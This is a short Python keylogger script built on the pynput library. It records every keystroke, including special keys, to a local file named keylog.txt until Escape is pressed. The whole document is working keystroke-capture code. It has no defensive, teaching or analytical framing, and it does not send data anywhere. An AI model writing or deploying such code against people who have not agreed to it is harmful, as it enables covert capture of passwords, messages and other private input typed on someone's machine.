from pynput.keyboard import Listener, Key

# Specify the log file
log_file = "keylog.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
